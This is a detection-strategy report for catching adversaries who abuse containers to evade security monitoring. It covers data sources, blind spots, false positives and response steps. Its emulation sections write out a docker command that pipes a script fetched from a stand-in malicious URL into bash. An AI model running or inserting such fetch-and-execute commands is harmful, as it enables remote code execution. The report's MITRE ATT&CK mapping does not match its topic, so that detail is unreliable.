# Alerting & Detection Strategy (ADS) Report: Detect Adversarial Attempts to Bypass Security Monitoring Using Containers

## Goal
This technique aims to detect adversarial attempts to bypass security monitoring by leveraging container technologies. The primary focus is on identifying malicious activities that exploit containers to evade detection and persist within an organization's network infrastructure.

## Categorization
- **MITRE ATT&CK Mapping:** T1586.001 - Social Media Accounts (Note: This mapping may need adjustment based on further analysis since the technique focuses on container usage for bypassing security measures, not directly social media accounts.)
- **Tactic / Kill Chain Phases:** Resource Development
- **Platforms:** PRE

## Strategy Abstract
The detection strategy involves monitoring and analyzing data from multiple sources associated with container usage. Key data sources include:
- Container orchestration logs (e.g., Kubernetes, Docker Swarm)
- Network traffic analysis for unusual patterns or communications between containers and external IPs
- Host-level security events related to container activities

Patterns analyzed will focus on:
- Unusual creation of containers or modifications in container configurations without proper authorization.
- Anomalous network traffic originating from containers.
- Containers running processes typically associated with evasion tactics, such as obfuscation tools.

## Technical Context
Adversaries may use containers to bypass security monitoring by taking advantage of the dynamic nature and resource abstraction of containerized environments. In practice, this could involve:
- Setting up ephemeral or disposable containers to execute malicious activities.
- Using containers to run processes that can obscure command-and-control (C2) communication.

### Adversary Emulation Details
An adversary might:
1. Deploy a new container with obfuscated payloads using Docker:
   ```bash
   docker run -d --name evil-container my_obfuscator_image /bin/bash -c "curl http://malicious-url.com/script.sh | bash"
   ```
2. Configure containers to use non-standard ports or protocols for communication.

## Blind Spots and Assumptions
- Assumes container orchestration platforms have logging enabled, which might not always be the case.
- Relies on baseline behavioral analysis; new techniques by adversaries could go undetected without regular updates to detection rules.
- Potential blind spots include encrypted traffic within containers that may conceal malicious activities.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate use of containerized applications for development and testing purposes.
- Authorized deployment of containers with dynamic configurations as part of DevOps practices.
- Routine updates or maintenance operations involving container orchestration platforms.

## Priority
**Priority Level: High**

Justification:
- Containers are increasingly used in modern IT infrastructures, making this technique relevant to many organizations.
- The ability to evade detection poses a significant risk to security postures if not effectively monitored and mitigated.

## Validation (Adversary Emulation)
Step-by-step instructions to emulate this technique in a test environment:

1. **Set Up Test Environment:**
   - Deploy a container orchestration platform like Kubernetes or Docker Swarm.
   - Ensure logging is enabled for all components.

2. **Simulate Adversarial Behavior:**
   - Create an obfuscated image containing a script:
     ```bash
     echo "curl http://malicious-url.com/script.sh | bash" > malicious_script.sh
     docker build -t my_obfuscator_image .
     ```
   - Deploy the container with unusual network communication:
     ```bash
     docker run -d --name evil-container my_obfuscator_image /bin/bash -c "./malicious_script.sh"
     ```

3. **Monitor and Analyze:**
   - Check orchestration logs for unauthorized container creation.
   - Use network traffic analysis tools to identify suspicious communications.

## Response
When the alert fires:
- Immediately isolate the affected containers to prevent further activities.
- Conduct a thorough investigation of the container's configuration, processes, and network connections.
- Review security policies related to container usage and update them as necessary to prevent recurrence.
- Report findings to relevant stakeholders and consider engaging incident response teams if needed.
